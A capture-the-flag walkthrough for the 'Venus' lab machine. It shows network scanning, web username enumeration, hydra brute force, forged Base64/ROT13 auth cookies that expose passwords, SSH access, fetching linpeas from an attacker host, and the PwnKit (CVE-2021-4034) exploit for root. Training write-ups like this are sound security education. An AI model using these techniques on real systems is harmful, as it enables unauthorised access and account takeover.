@@ -1,0 +1,397 @@
+Venus Machine:
+
+
+Discovering IP address:
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                             
+                                                                                                                                                                                           
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                           
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                          
+ 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                          
+ 10.0.2.3        08:00:27:e9:fd:13      1      60  PCS Systemtechnik GmbH                                                                                                                  
+ 10.0.2.15       08:00:27:18:54:5e      1      60  PCS Systemtechnik GmbH        
+
+
+
+
+ rustscan:
+
+PORT      STATE    SERVICE    REASON
+22/tcp    open     ssh        syn-ack ttl 64
+8080/tcp  open     http-proxy syn-ack ttl 64
+26161/tcp filtered unknown    admin-prohibited ttl 64
+MAC Address: 08:00:27:18:54:5E (Oracle VirtualBox virtual NIC)
+
+
+
+ nmap:
+
+ PORT      STATE    SERVICE    REASON         VERSION
+22/tcp    open     ssh        syn-ack ttl 64 OpenSSH 8.5 (protocol 2.0)
+| ssh-hostkey: 
+|   256 b0:3e:1c:68:4a:31:32:77:53:e3:10:89:d6:29:78:50 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+dV9A80/dgYSig2NEBJYcoRe6VFus7DqjGWjNYjN4FH4e8scrM8P9zuw8EYJTdIjDVeJbersbscUbJTTH3C+w=
+|   256 fd:b4:20:d0:d8:da:02:67:a4:a5:48:f3:46:e2:b9:0f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEG7ONqJEC7HEEiTZaI+MemunphhJ23BhWM0eLlcL/BJ
+8080/tcp  open     http-proxy syn-ack ttl 64 WSGIServer/0.2 CPython/3.9.5
+|_http-server-header: WSGIServer/0.2 CPython/3.9.5
+|_http-title: Venus Monitoring Login
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Thu, 05 Jun 2025 09:00:50 GMT
+|     Server: WSGIServer/0.2 CPython/3.9.5
+|     Content-Type: text/html; charset=utf-8
+|     X-Frame-Options: DENY
+|     Content-Length: 626
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: same-origin
+|     <html>
+|     <head>
+|     <title>Venus Monitoring Login</title>
+|     <style>
+|     .aligncenter {
+|     text-align: center;
+|     label {
+|     display:block;
+|     position:relative;
+|     </style>
+|     </head>
+|     <body>
+|     <h1> Venus Monitoring Login </h1>
+|     <h2>Please login: </h2>
+|     Credentials guest:guest can be used to access the guest account.
+|     <form action="/" method="post">
+|     <label for="username">Username:</label>
+|     <input id="username" type="text" name="username">
+|     <label for="password">Password:</label>
+|     <input id="username" type="text" name="password">
+|     <input type="submit" value="Login">
+|     </form>
+|     </body>
+|_    </html>
+9753/tcp  filtered rasadv     no-response
+26161/tcp filtered unknown    no-response
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.94SVN%I=7%D=6/5%Time=68415CC3%P=x86_64-pc-linux-gnu%r(
+SF:GetRequest,363,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2005\x20Jun\x2
+SF:02025\x2009:00:50\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.9\
+SF:.5\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\
+SF:x20DENY\r\nContent-Length:\x20626\r\nX-Content-Type-Options:\x20nosniff
+SF:\r\nReferrer-Policy:\x20same-origin\r\n\r\n<html>\n<head>\n<title>Venus
+SF:\x20Monitoring\x20Login</title>\n<style>\n\.aligncenter\x20{\n\x20\x20\
+SF:x20\x20text-align:\x20center;\n}\nlabel\x20{\n\x20\x20\x20\x20display:b
+SF:lock;\n\x20\x20\x20\x20position:relative;\n}\n</style>\n</head>\n<body>
+SF:\n<h1>\x20Venus\x20Monitoring\x20Login\x20</h1>\n<h2>Please\x20login:\x
+SF:20</h2>\nCredentials\x20guest:guest\x20can\x20be\x20used\x20to\x20acces
+SF:s\x20the\x20guest\x20account\.\n<form\x20action=\"/\"\x20method=\"post\
+SF:">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"username
+SF:\">Username:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20type
+SF:=\"text\"\x20name=\"username\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x2
+SF:0\x20<label\x20for=\"password\">Password:</label>\n\x20\x20\x20\x20<inp
+SF:ut\x20id=\"username\"\x20type=\"text\"\x20name=\"password\">\n\x20\x20\
+SF:x20\x20<br\x20/>\n\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"
+SF:Login\">\n</form>\n\n</body>\n</html>\n")%r(HTTPOptions,363,"HTTP/1\.1\
+SF:x20200\x20OK\r\nDate:\x20Thu,\x2005\x20Jun\x202025\x2009:00:50\x20GMT\r
+SF:\nServer:\x20WSGIServer/0\.2\x20CPython/3\.9\.5\r\nContent-Type:\x20tex
+SF:t/html;\x20charset=utf-8\r\nX-Frame-Options:\x20DENY\r\nContent-Length:
+SF:\x20626\r\nX-Content-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20sa
+SF:me-origin\r\n\r\n<html>\n<head>\n<title>Venus\x20Monitoring\x20Login</t
+SF:itle>\n<style>\n\.aligncenter\x20{\n\x20\x20\x20\x20text-align:\x20cent
+SF:er;\n}\nlabel\x20{\n\x20\x20\x20\x20display:block;\n\x20\x20\x20\x20pos
+SF:ition:relative;\n}\n</style>\n</head>\n<body>\n<h1>\x20Venus\x20Monitor
+SF:ing\x20Login\x20</h1>\n<h2>Please\x20login:\x20</h2>\nCredentials\x20gu
+SF:est:guest\x20can\x20be\x20used\x20to\x20access\x20the\x20guest\x20accou
+SF:nt\.\n<form\x20action=\"/\"\x20method=\"post\">\n\x20\x20\x20\x20<br\x2
+SF:0/>\n\x20\x20\x20\x20<label\x20for=\"username\">Username:</label>\n\x20
+SF:\x20\x20\x20<input\x20id=\"username\"\x20type=\"text\"\x20name=\"userna
+SF:me\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20\x20\x20<label\x20for=\"passw
+SF:ord\">Password:</label>\n\x20\x20\x20\x20<input\x20id=\"username\"\x20t
+SF:ype=\"text\"\x20name=\"password\">\n\x20\x20\x20\x20<br\x20/>\n\x20\x20
+SF:\x20\x20<input\x20type=\"submit\"\x20value=\"Login\">\n</form>\n\n</bod
+SF:y>\n</html>\n");
+MAC Address: 08:00:27:18:54:5E (Oracle VirtualBox virtual NIC)
+
+
+nikto:
+
+
+nikto -h http://10.0.2.15:8080
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.15
++ Target Hostname:    10.0.2.15
++ Target Port:        8080
++ Start Time:         2025-06-05 05:00:10 (GMT-4)
+---------------------------------------------------------------------------
++ Server: WSGIServer/0.2 CPython/3.9.5
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ 8103 requests: 0 error(s) and 1 item(s) reported on remote host
++ End Time:           2025-06-05 05:08:48 (GMT-4) (518 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+
+Directory enumeration:
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.15:8080/FUZZ       
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.15:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
+:: Progress: [20469/20469] :: Job [1/1] :: 787 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
+
+
+there are some credentials present on the website, but if you add the wrong password, you get a really descriptive message. This means that you can do username enumeration and password bruteforce.
+Credentials guest:guest can be used to access the guest account.
+
+Username:
+
+Password:
+
+Invalid password. 
+
+
+Let's start with username enumeration:
+
+wfuzz -c -u"http://10.0.2.15:8080/" -d "username=FUZZ&password=test123" -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --ss "Invalid password."
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.0.2.15:8080/
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                     
+=====================================================================
+
+000001243:   200        34 L     66 W       651 Ch      "guest"                                                                                                                     
+000017545:   200        34 L     66 W       651 Ch      "venus"                                                                                                                     
+000031148:   200        34 L     66 W       651 Ch      "magellan" 
+
+we can try our luck to see if we can guess the pasword:
+hydra -L users.txt -p guest -s 8080 10.0.2.15 http-post-form "/:username=^USER^&password=^PASS^:Invalid username."
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-05 05:35:49
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
+[DATA] attacking http-post-form://10.0.2.15:8080/:username=^USER^&password=^PASS^:Invalid username.
+[8080][http-post-form] host: 10.0.2.15   login: guest   password: guest
+[8080][http-post-form] host: 10.0.2.15   login: magellan   password: guest
+[8080][http-post-form] host: 10.0.2.15   login: venus   password: guest
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-05 05:35:50
+
+
+
+While inspecting a login request for credentials guest:guest, we can observe a weird cookie being set: Set-Cookie:  auth="Z3Vlc3Q6dGhyZmc="; Path=/
+
+auth value seems to be Base64, and if we decode it its: guest:thrfg
+
+If we use ROT13 on thrfg we get guest. This is the password for this user. 
+Let's check with different users:
+
+In order to do this, we need to create another auth cookie, but how do we do it.
+
+The cookie works as a pair or username:passwd . From hydra results we know that venus and magellan users both use the password guest, which in rot13 is thrfg .
+
+We can now craft 2 pairs of creds : magellan:thrfg and venus:thrfg. 
+Then we encode them into base64 and we add a new entry in the request header for cookie:
+
+for magellan we use auth="WFnZWxsYW46dGhyZmc="
+for venus we use auth="dmVudXM6dGhyZmc="
+
+we than change the request as follows:
+
+Cookie: csrftoken=PGhRfLeCub4HM0NP8g6WPS0fNyE1gnjFFpyykwED7xq3oGK6mPdP4gCziKkzijzN; auth="bWFnZWxsYW46dGhyZmc="
+
+Then we change the username to magellan as follows and we click send:
+username=magellan&password=guest
+
+This is the result for magellan:
+Set-Cookie:  auth="bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ=="; Path=/
+
+decoding the result of magellan from base64 we get: magellan:irahfvnatrbybtl1989, and using rot13 on irahfvnatrbybtl1989 we get : venusiangeology1989
+
+This is the result for venus:
+
+Set-Cookie:  auth="dmVudXM6aXJhaGY="; Path=/
+
+decoding the result of venus from Base64 we get : venus:irahf, and using rot13 on irahf we get: venus
+
+
+
+
+Since the SSH port is opened ,and we got our hands on some creds, we can use them to see if we can ssh to the machine:
+hydra -L users.txt -P pass.txt ssh://10.0.2.15                                                                    
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-05 08:01:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
+[DATA] attacking ssh://10.0.2.15:22/
+[22][ssh] host: 10.0.2.15   login: magellan   password: venusiangeology1989
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-05 08:02:01
+
+
+We can ssh with user magellan and pass: venusiangeology1989
+
+[magellan@venus ~]$ id
+uid=1001(magellan) gid=1001(magellan) groups=1001(magellan) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[magellan@venus ~]$ 
+
+
+
+USER FLAG:
+[magellan@venus ~]$ cat user_flag.txt 
+[user_flag_e799a60032068b27b8ff212b57c200b0]
+
+
+
+PRIV ESC:
+
+magellan@venus ~]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for magellan: 
+Sorry, user magellan may not run sudo on venus.
+
+
+
+let's use linpeas.sh to see our options for PRIVESC:
+
+HOST linpeas.sh
+
+python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.0.2.15 - - [05/Jun/2025 08:07:03] "GET /linpeas.sh HTTP/1.1" 200 -
+
+
+
+
+get it on the victim machine:
+
+[magellan@venus ~]$ wget http://10.0.2.4/linpeas.sh
+--2025-06-05 13:07:03--  http://10.0.2.4/linpeas.sh
+Connecting to 10.0.2.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 840082 (820K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                      100%[====================================================================================================>] 820.39K  --.-KB/s    in 0.02s   
+
+2025-06-05 13:07:03 (52.5 MB/s) - ‘linpeas.sh’ saved [840082/840082]
+
+[magellan@venus ~]$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/cockpit-session
+
+polkit can be abused:
+https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+
+download the archive locally, and host it, then on the victim machine download it and unzip it:
+
+then run the exploit
+
+
+magellan@venus ~]$ ls
+17932.c  CVE-2021-4034-main  CVE-2021-4034-main.zip  linpeas.sh  user_flag.txt  venus_monitor_proj
+[magellan@venus ~]$ cd CVE-2021-4034-main/
+[magellan@venus CVE-2021-4034-main]$ ls
+cve-2021-4034.c  cve-2021-4034.sh  dry-run  LICENSE  Makefile  pwnkit.c  README.md
+[magellan@venus CVE-2021-4034-main]$ ./cve-2021-4034.sh 
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+sh-5.1# id
+uid=0(root) gid=0(root) groups=0(root),1001(magellan) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-5.1# 
+
+
+
+sh-5.1# cd /root
+sh-5.1# ls
+anaconda-ks.cfg  root_flag.txt
+sh-5.1# cat root_flag.txt 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Congratulations on completing Venus!!!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_83588a17919eba10e20aad15081346af]
+sh-5.1# 
+
+
